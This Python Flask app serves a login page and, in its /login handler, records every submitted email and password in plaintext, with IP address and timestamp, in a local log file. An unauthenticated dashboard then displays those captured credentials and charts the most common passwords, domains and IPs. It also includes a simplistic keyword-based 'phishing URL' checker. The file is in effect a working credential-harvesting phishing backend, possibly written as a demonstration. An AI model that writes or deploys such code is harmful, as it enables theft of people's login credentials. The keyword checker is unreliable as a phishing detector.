from flask import Flask, render_template, request, redirect, url_for
import os
import matplotlib.pyplot as plt
import pandas as pd
import uuid
import re
from datetime import datetime

app = Flask(__name__)
LOG_FILE = "log.txt"

def is_phishing_site(url):
    suspicious_keywords = ["login", "bank", "verify", "update", "secure", "account"]
    score = sum(1 for word in suspicious_keywords if word in url.lower())
    return "⚠️ Phishing" if score > 0 else "✅ Safe"

def analyze_url(url):
    return {
        "url": url,
        "length": len(url),
        "dots": url.count("."),
        "slashes": url.count("/"),
        "suspicious_words": sum(1 for w in ["login", "verify", "bank", "secure", "account", "update"] if w in url.lower()),
        "label": is_phishing_site(url)
    }

def create_log_graphs():
    timestamps, emails, passwords, ips = [], [], [], []

    if not os.path.exists(LOG_FILE):
        return [None]*4

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        for line in f:
            ts_match = re.match(r"^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})", line)
            ip_match = re.search(r"IP: ([\d\.]+)", line)
            email_match = re.search(r"Email: ([^,\s]+)", line)
            pwd_match = re.search(r"Password: (\S+)", line)

            timestamp = ts_match.group(1) if ts_match else None
            email = email_match.group(1) if email_match else None
            pwd = pwd_match.group(1) if pwd_match else None
            ip = ip_match.group(1) if ip_match else None

            if email and pwd:
                timestamps.append(timestamp)
                ips.append(ip or "unknown")
                emails.append(email)
                passwords.append(pwd)

    if not timestamps:
        return [None]*4

    df = pd.DataFrame({
        "timestamp": pd.to_datetime(timestamps, errors='coerce'),
        "email": emails,
        "password": passwords,
        "ip": ips
    })

    df["domain"] = df["email"].apply(lambda x: x.split("@")[-1] if "@" in x else x)
    df["hour"] = df["timestamp"].dt.hour

    plots = []
    for col, title, color in [
        ("domain", "Top 5 Email Domains", "blue"),
        ("password", "Top 5 Passwords", "red"),
        ("ip", "Top 5 IP Addresses", "green"),
        ("hour", "Activity by Hour", "purple")
    ]:
        values = df[col].value_counts().head(5)
        if values.empty:
            fig, ax = plt.subplots()
            ax.text(0.5, 0.5, "📉 No data available", ha='center', va='center', fontsize=14)
            ax.set_title(title)
            ax.axis("off")
            path = f"static/{col}_{uuid.uuid4().hex}.png"
            fig.savefig(path)
            plt.close(fig)
            plots.append(path)
            continue
        fig, ax = plt.subplots()
        values.plot(kind="bar", ax=ax, color=color)
        ax.set_title(title)
        ax.set_ylabel("Count")
        plt.xticks(rotation=45)
        path = f"static/{col}_{uuid.uuid4().hex}.png"
        fig.savefig(path)
        plt.close(fig)
        plots.append(path)

    return plots

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def do_login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, 'a') as f:
        f.write(f"{timestamp} | IP: {ip} | Email: {email} | Password: {password}\n")
    return redirect(url_for('dashboard'))

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            logs = f.readlines()

    url_features = None
    if request.method == 'POST':
        url_to_check = request.form.get('url_to_check')
        if url_to_check:
            url_features = analyze_url(url_to_check)

    g1, g2, g3, g4 = create_log_graphs()

    return render_template('dashboard.html', logs=logs,
                           url_features=url_features,
                           g1=g1, g2=g2, g3=g3, g4=g4)

if __name__ == '__main__':
    app.run(debug=True)
